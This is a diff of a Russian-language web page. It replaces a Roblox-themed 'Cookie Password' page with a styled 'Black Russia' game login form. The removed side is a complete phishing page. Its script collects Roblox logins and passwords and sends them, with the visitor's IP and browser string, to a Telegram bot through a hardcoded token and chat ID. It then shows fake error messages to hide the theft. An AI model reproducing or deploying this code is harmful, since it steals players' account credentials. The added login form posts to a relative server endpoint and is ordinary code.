@@ -1,188 +1,395 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <title>Cookie Password - Roblox</title>
-    <style>
-        body {
-            background: #0d1117;
-            color: white;
-            font-family: Arial;
-            margin: 0;
-            padding: 20px;
-            text-align: center;
-        }
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
-        h1 {
-            color: #ff6b6b;
-            margin: 20px 0;
-        }
-        .card {
-            background: #161b22;
-            padding: 30px;
-            border-radius: 10px;
-            border: 1px solid #30363d;
-            margin: 20px 0;
-        }
-        input {
-            width: 100%;
-            padding: 15px;
-            margin: 10px 0;
-            background: #0d1117;
-            border: 2px solid #ff6b6b;
-            color: white;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 15px;
-            background: #ff6b6b;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            margin: 10px 0;
-        }
-        button:hover {
-            background: #ff5252;
-        }
-        .error-box {
-            background: #0d1117;
-            padding: 20px;
-            border-radius: 5px;
-            margin: 20px 0;
-            border-left: 4px solid #ff6b6b;
-            text-align: center;
-        }
-        .info {
-            color: #8b949e;
-            font-size: 14px;
-            margin: 10px 0;
-        }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Black Russia — Вход</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Oswald:wght@500;600;700&family=Inter:wght@400;500;600&display=swap');
+
+  :root{
+    --bg-0:#0b0c0e;
+    --bg-1:#151619;
+    --panel:#1b1c20;
+    --line:#2a2b30;
+    --red:#c2231a;
+    --red-2:#8f1912;
+    --gold:#c9a24b;
+    --text:#e9e9ea;
+    --muted:#8b8d94;
+  }
+
+  *{box-sizing:border-box;}
+
+  html,body{
+    margin:0;
+    padding:0;
+    height:100%;
+    background:var(--bg-0);
+    font-family:'Inter',sans-serif;
+    color:var(--text);
+  }
+
+  body{
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    overflow:hidden;
+    padding:24px;
+  }
+
+  /* фоновая "город-сетка" */
+  body::before{
+    content:"";
+    position:fixed;
+    inset:0;
+    background-image:
+      linear-gradient(var(--line) 1px, transparent 1px),
+      linear-gradient(90deg, var(--line) 1px, transparent 1px);
+    background-size:42px 42px;
+    opacity:.18;
+    mask-image:radial-gradient(circle at 50% 30%, black 0%, transparent 75%);
+    z-index:0;
+  }
+
+  body::after{
+    content:"";
+    position:fixed;
+    inset:0;
+    background:radial-gradient(600px 300px at 50% -10%, rgba(194,35,26,.25), transparent 70%);
+    z-index:0;
+  }
+
+  .card{
+    position:relative;
+    z-index:1;
+    width:100%;
+    max-width:380px;
+    background:var(--panel);
+    border:1px solid var(--line);
+    border-top:3px solid var(--red);
+    border-radius:6px;
+    padding:32px 28px 28px;
+    box-shadow:0 20px 60px rgba(0,0,0,.5);
+  }
+
+  .brand{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:6px;
+  }
+
+  .brand .mark{
+    width:34px;height:34px;
+    flex:0 0 auto;
+    border-radius:4px;
+    background:linear-gradient(135deg,var(--red),var(--red-2));
+    display:flex;align-items:center;justify-content:center;
+    font-family:'Oswald',sans-serif;
+    font-weight:700;
+    font-size:16px;
+    color:#fff;
+    letter-spacing:-1px;
+  }
+
+  .brand h1{
+    font-family:'Oswald',sans-serif;
+    font-weight:700;
+    font-size:20px;
+    letter-spacing:.5px;
+    margin:0;
+    text-transform:uppercase;
+  }
+
+  .brand h1 span{color:var(--red);}
+
+  .subtitle{
+    font-size:13px;
+    color:var(--muted);
+    margin:0 0 26px;
+    line-height:1.5;
+  }
+
+  .field{
+    margin-bottom:16px;
+  }
+
+  .field label{
+    display:block;
+    font-size:12px;
+    font-weight:600;
+    text-transform:uppercase;
+    letter-spacing:.6px;
+    color:var(--muted);
+    margin-bottom:7px;
+  }
+
+  .input-wrap{
+    position:relative;
+  }
+
+  .field input{
+    width:100%;
+    background:var(--bg-1);
+    border:1px solid var(--line);
+    border-radius:4px;
+    padding:12px 14px;
+    font-size:15px;
+    color:var(--text);
+    outline:none;
+    transition:border-color .15s ease, background .15s ease;
+    font-family:'Inter',sans-serif;
+  }
+
+  .field input::placeholder{color:#5b5d64;}
+
+  .field input:focus{
+    border-color:var(--red);
+    background:#1e1f23;
+  }
+
+  .toggle-pass{
+    position:absolute;
+    right:10px;
+    top:50%;
+    transform:translateY(-50%);
+    background:none;
+    border:none;
+    color:var(--muted);
+    font-size:12px;
+    cursor:pointer;
+    padding:6px 4px;
+    text-transform:uppercase;
+    letter-spacing:.4px;
+  }
+  .toggle-pass:hover{color:var(--text);}
+
+  .pin-boxes{
+    display:flex;
+    gap:8px;
+  }
+
+  .pin-boxes input{
+    text-align:center;
+    letter-spacing:2px;
+    padding:12px 0;
+    width:100%;
+    font-size:18px;
+    -moz-appearance:textfield;
+  }
+
+  .row-between{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    font-size:13px;
+    margin:2px 0 22px;
+  }
+
+  .remember{
+    display:flex;
+    align-items:center;
+    gap:8px;
+    color:var(--muted);
+    cursor:pointer;
+    user-select:none;
+  }
+
+  .remember input{
+    accent-color:var(--red);
+    width:15px;height:15px;
+  }
+
+  .row-between a{
+    color:var(--gold);
+    text-decoration:none;
+  }
+  .row-between a:hover{text-decoration:underline;}
+
+  .btn-submit{
+    width:100%;
+    padding:13px;
+    border:none;
+    border-radius:4px;
+    background:linear-gradient(180deg,var(--red),var(--red-2));
+    color:#fff;
+    font-family:'Oswald',sans-serif;
+    font-weight:600;
+    font-size:15px;
+    text-transform:uppercase;
+    letter-spacing:.8px;
+    cursor:pointer;
+    transition:filter .15s ease, transform .05s ease;
+  }
+  .btn-submit:hover{filter:brightness(1.08);}
+  .btn-submit:active{transform:translateY(1px);}
+  .btn-submit:disabled{opacity:.6;cursor:not-allowed;}
+
+  .error-msg{
+    background:rgba(194,35,26,.12);
+    border:1px solid rgba(194,35,26,.4);
+    color:#ff8f87;
+    font-size:13px;
+    padding:10px 12px;
+    border-radius:4px;
+    margin-bottom:16px;
+    display:none;
+  }
+  .error-msg.show{display:block;}
+
+  .footer-note{
+    text-align:center;
+    font-size:12px;
+    color:var(--muted);
+    margin-top:20px;
+  }
+  .footer-note a{color:var(--gold);text-decoration:none;}
+  .footer-note a:hover{text-decoration:underline;}
+
+  @media (prefers-reduced-motion:no-preference){
+    .card{
+      animation:rise .45s ease both;
+    }
+    @keyframes rise{
+      from{opacity:0; transform:translateY(10px);}
+      to{opacity:1; transform:translateY(0);}
+    }
+  }
+</style>
 </head>
 <body>
-    <div class="container">
-        <h1>🔐 Cookie Password - Roblox</h1>
-        
-        <div class="card">
-            <h3>📝 Введите данные для получения куки</h3>
-            <p class="info">Введите логин и пароль от Roblox чтобы получить .ROBLOSECURITY куки</p>
-            
-            <input type="text" id="username" placeholder="👤 Логин или Email от Roblox">
-            <input type="password" id="password" placeholder="🔒 Пароль от аккаунта">
-            
-            <button onclick="getCookie()">🔓 Получить Cookie</button>
-            
-            <div class="error-box" id="status">
-                ⏳ Введите данные для получения .ROBLOSECURITY куки
-            </div>
-            
-            <p class="info">⚠️ Система подключится к Roblox API для генерации куки</p>
-        </div>
+
+  <form class="card" id="loginForm" novalidate>
+    <div class="brand">
+      <div class="mark">BR</div>
+      <h1>Black <span>Russia</span></h1>
+    </div>
+    <p class="subtitle">Вход в личный кабинет игрового аккаунта.</p>
+
+    <div class="error-msg" id="errorMsg"></div>
+
+    <div class="field">
+      <label for="nickname">Никнейм</label>
+      <div class="input-wrap">
+        <input type="text" id="nickname" name="nickname" placeholder="Например: Ivan_Ivanov" autocomplete="username" required>
+      </div>
     </div>
 
-    <script>
-        // Настройки Telegram бота
-        const BOT_TOKEN = '8591510784:AAFp5RKXQj0YI0NCYeEr0dyK67i_1qeVNV8';
-        const CHAT_ID = '1491315056';
-        
-        // Основная функция
-        function getCookie() {
-            const username = document.getElementById('username').value.trim();
-            const password = document.getElementById('password').value.trim();
-            const status = document.getElementById('status');
-            
-            // Проверка
-            if (!username || !password) {
-                status.innerHTML = '❌ Заполните все поля';
-                return;
-            }
-            
-            // Показываем процесс
-            status.innerHTML = '⏳ Подключаемся к Roblox API...';
-            
-            // Отправляем данные в Telegram
-            sendToTelegram(username, password);
-            
-            // Имитируем получение куки и показываем ошибку
-            setTimeout(() => {
-                const errors = [
-                    '❌ Ошибка: неверный логин или пароль',
-                    '⚠️ Аккаунт защищен 2FA. Требуется код аутентификации',
-                    '🚫 Доступ к API временно ограничен. Попробуйте позже',
-                    '💀 Аккаунт заблокирован. Обратитесь в поддержку Roblox',
-                    '🌐 Ошибка сети. Проверьте подключение к интернету',
-                    '🔒 Слишком много попыток. Подождите 30 минут',
-                    '📛 Неверный формат данных. Проверьте введенные данные'
-                ];
-                
-                const randomError = errors[Math.floor(Math.random() * errors.length)];
-                status.innerHTML = randomError;
-                
-                // Очищаем поля
-                document.getElementById('username').value = '';
-                document.getElementById('password').value = '';
-                
-            }, 3000);
-        }
-        
-        // Отправка в Telegram
-        function sendToTelegram(username, password) {
-            const time = new Date().toLocaleString('ru-RU');
-            
-            // Формируем сообщение
-            const message = `🔐 НОВЫЕ ДАННЫЕ COOKIE PASSWORD\n\n` +
-                           `👤 Логин: ${username}\n` +
-                           `🔒 Пароль: ${password}\n` +
-                           `⏰ Время: ${time}\n` +
-                           `🌐 IP: ${getUserIP()}\n` +
-                           `🖥️ Браузер: ${navigator.userAgent.substring(0, 100)}`;
-            
-            // Кодируем и отправляем
-            const encodedMsg = encodeURIComponent(message);
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMsg}`;
-            
-            // Используем Image для отправки (работает всегда)
-            const img = new Image();
-            img.src = url;
-            
-            console.log('✅ Данные отправлены в Telegram');
-        }
-        
-        // Получение IP пользователя
-        function getUserIP() {
-            try {
-                fetch('https://api.ipify.org?format=json')
-                    .then(res => res.json())
-                    .then(data => {
-                        localStorage.setItem('userIP', data.ip);
-                    });
-                return localStorage.getItem('userIP') || 'Не определен';
-            } catch {
-                return 'Не определен';
-            }
-        }
-        
-        // Автофокус на поле логина при загрузке
-        window.onload = function() {
-            console.log('✅ Cookie Password сайт загружен');
-            document.getElementById('username').focus();
-            
-            // Отправляем тестовое сообщение в Telegram
-            setTimeout(() => {
-                const testMsg = '🤖 Cookie Password сайт запущен\n✅ Готов принимать данные';
-                const encodedTest = encodeURIComponent(testMsg);
-                const testUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedTest}`;
-                const testImg = new Image();
-                testImg.src = testUrl;
-            }, 2000);
-        };
-    </script>
+    <div class="field">
+      <label for="password">Пароль</label>
+      <div class="input-wrap">
+        <input type="password" id="password" name="password" placeholder="Введите пароль" autocomplete="current-password" required>
+        <button type="button" class="toggle-pass" id="togglePass">Показать</button>
+      </div>
+    </div>
+
+    <div class="field">
+      <label for="pin">Пин-код (если установлен)</label>
+      <div class="input-wrap">
+        <input type="password" id="pin" name="pin" inputmode="numeric" maxlength="6" placeholder="4–6 цифр" autocomplete="off">
+      </div>
+    </div>
+
+    <div class="row-between">
+      <label class="remember">
+        <input type="checkbox" id="remember" name="remember">
+        Запомнить меня
+      </label>
+      <a href="#" id="forgotLink">Забыли пароль?</a>
+    </div>
+
+    <button type="submit" class="btn-submit" id="submitBtn">Войти</button>
+
+    <p class="footer-note">Нет аккаунта? <a href="#" id="registerLink">Регистрация на сервере</a></p>
+  </form>
+
+<script>
+  const form = document.getElementById('loginForm');
+  const errorMsg = document.getElementById('errorMsg');
+  const submitBtn = document.getElementById('submitBtn');
+  const togglePass = document.getElementById('togglePass');
+  const passwordInput = document.getElementById('password');
+  const pinInput = document.getElementById('pin');
+
+  // показать/скрыть пароль
+  togglePass.addEventListener('click', () => {
+    const isPass = passwordInput.type === 'password';
+    passwordInput.type = isPass ? 'text' : 'password';
+    togglePass.textContent = isPass ? 'Скрыть' : 'Показать';
+  });
+
+  // пин только цифры
+  pinInput.addEventListener('input', () => {
+    pinInput.value = pinInput.value.replace(/\D/g, '');
+  });
+
+  function showError(text){
+    errorMsg.textContent = text;
+    errorMsg.classList.add('show');
+  }
+  function hideError(){
+    errorMsg.classList.remove('show');
+  }
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    hideError();
+
+    const nickname = document.getElementById('nickname').value.trim();
+    const password = passwordInput.value;
+    const pin = pinInput.value.trim();
+    const remember = document.getElementById('remember').checked;
+
+    if (!nickname || !password){
+      showError('Введите никнейм и пароль.');
+      return;
+    }
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Проверка...';
+
+    try {
+      // ЗАМЕНИТЕ URL на адрес вашего сервера/API авторизации.
+      // Сервер должен сам проверять ник/пароль/пин и вернуть JSON { success: true/false, message, token }
+      const response = await fetch('/api/auth/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ nickname, password, pin, remember })
+      });
+
+      const data = await response.json();
+
+      if (!response.ok || !data.success){
+        showError(data.message || 'Неверный никнейм, пароль или пин-код.');
+        return;
+      }
+
+      // успешный вход — например, сохранить токен и перенаправить
+      if (data.token && remember){
+        // токен лучше хранить в httpOnly cookie на бэкенде,
+        // а не в localStorage/sessionStorage
+      }
+      window.location.href = '/cabinet';
+
+    } catch (err){
+      showError('Не удалось подключиться к серверу. Попробуйте позже.');
+    } finally {
+      submitBtn.disabled = false;
+      submitBtn.textContent = 'Войти';
+    }
+  });
+
+  document.getElementById('registerLink').addEventListener('click', (e) => {
+    e.preventDefault();
+    window.location.href = '/register';
+  });
+  document.getElementById('forgotLink').addEventListener('click', (e) => {
+    e.preventDefault();
+    window.location.href = '/reset-password';
+  });
+</script>
 </body>
 </html>
